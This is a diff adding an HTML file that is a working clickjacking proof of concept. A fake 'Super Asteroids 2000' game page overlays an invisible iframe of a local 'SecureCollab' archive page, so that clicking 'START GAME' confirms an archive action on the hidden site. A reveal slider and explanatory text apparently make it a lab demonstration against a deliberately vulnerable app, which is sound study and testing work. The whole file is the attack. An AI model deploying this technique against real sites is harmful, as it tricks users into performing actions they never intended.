@@ -1,0 +1,87 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Play Free Flash Games Online!</title>
+    <style>
+        body { font-family: 'Comic Sans MS', cursive, sans-serif; background: #282c34; color: white; text-align: center; margin: 0; padding-top: 40px; }
+        h1 { color: #61dafb; }
+        
+        .game-container {
+            position: relative;
+            width: 800px;
+            height: 600px;
+            margin: 0 auto;
+            background: #1e1e1e;
+            border: 4px solid #61dafb;
+            border-radius: 10px;
+            overflow: hidden;
+        }
+
+        /* The decoy layer that the user thinks they are interacting with */
+        .decoy {
+            position: absolute;
+            top: 0; left: 0; right: 0; bottom: 0;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            z-index: 5;
+            background: url('https://upload.wikimedia.org/wikipedia/commons/thumb/c/c5/Asteroids_arcade_game_screen.jpg/800px-Asteroids_arcade_game_screen.jpg') center/cover;
+        }
+
+        .play-btn {
+            background: #ff4757;
+            color: white;
+            border: 4px solid white;
+            padding: 15px 40px;
+            font-size: 2rem;
+            font-weight: bold;
+            border-radius: 50px;
+            cursor: pointer;
+            box-shadow: 0 0 20px #ff4757;
+            text-shadow: 2px 2px 4px rgba(0,0,0,0.5);
+            /* Important: pointer-events none makes clicks pass THROUGH to the iframe below! */
+            pointer-events: none;
+        }
+
+        /* The malicious iframe */
+        .victim-iframe {
+            position: absolute;
+            top: 0; left: 0;
+            width: 100%; height: 100%;
+            border: none;
+            z-index: 10;
+            /* ATTACK MODE: opacity 0 makes the SecureCollab site completely invisible */
+            /* Set to 0.5 to see how the attack aligns */
+            opacity: 0.0;
+        }
+
+        .controls { margin-top: 20px; }
+    </style>
+</head>
+<body>
+    <h1>Super Asteroids 2000!</h1>
+    
+    <div class="game-container">
+        <!-- User sees this -->
+        <div class="decoy">
+            <button class="play-btn">START GAME</button>
+        </div>
+
+        <!-- User actually clicks this -->
+        <!-- We load the vulnerable Archive page, which has a "Confirm Archive" button right where "START GAME" is -->
+        <iframe class="victim-iframe" id="victim" src="http://localhost/securecollab-vulnerable/projects/archive.php?id=1"></iframe>
+    </div>
+
+    <div class="controls">
+        <label>Reveal Iframe (for demonstration): </label>
+        <input type="range" min="0" max="100" value="0" oninput="document.getElementById('victim').style.opacity = this.value/100;">
+        <p style="color: #888; font-family: sans-serif; font-size: 0.9rem;">
+            This is an external attacker website. 
+            The vulnerable app is framed invisibly.<br>
+            When the user clicks "START GAME", they actually click "Confirm Archive" on the hidden SecureCollab page.
+        </p>
+    </div>
+</body>
+</html>
